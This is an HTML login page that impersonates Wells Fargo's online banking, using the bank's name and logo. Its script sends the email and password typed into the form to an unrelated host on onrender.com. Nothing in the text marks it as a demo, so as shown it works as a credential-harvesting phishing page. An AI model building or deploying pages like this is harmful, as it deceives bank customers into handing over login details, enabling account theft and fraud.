<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wells Fargo - Login</title>
  <link rel="stylesheet" href="login.css" />
</head>
<body>
  <header>
  <div style="display: flex; align-items: center; justify-content: center;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Wells_Fargo_Bank.svg/2560px-Wells_Fargo_Bank.svg.png" alt="Wells Fargo Logo" style="height: 40px; margin-right: 10px;">
    <h1 style="margin: 0;">Wells Fargo Online Banking</h1>
  </div>
</header>
  <div class="login-container">
    <h2>Wells Fargo Login</h2>
    <form id="login-form">
      <input type="email" id="email" placeholder="Email" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
    <p>Don't have an account? <a href="signup.html">Sign up here</a></p>
  </div>

  <script>
    const BASE_URL = 'https://backend15-nnmy.onrender.com';

    document.getElementById('login-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      try {
        const res = await fetch(`${BASE_URL}/api/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        });

        const data = await res.json();

        if (data.token) {
          localStorage.setItem('token', data.token);
          window.location.href = 'dashboard.html'; // âœ… Make sure dashboard.html exists
        } else {
          alert(data.message || 'Invalid credentials');
        }
      } catch (err) {
        alert('Network error. Please try again.');
      }
    });
  </script>
</body>
</html>
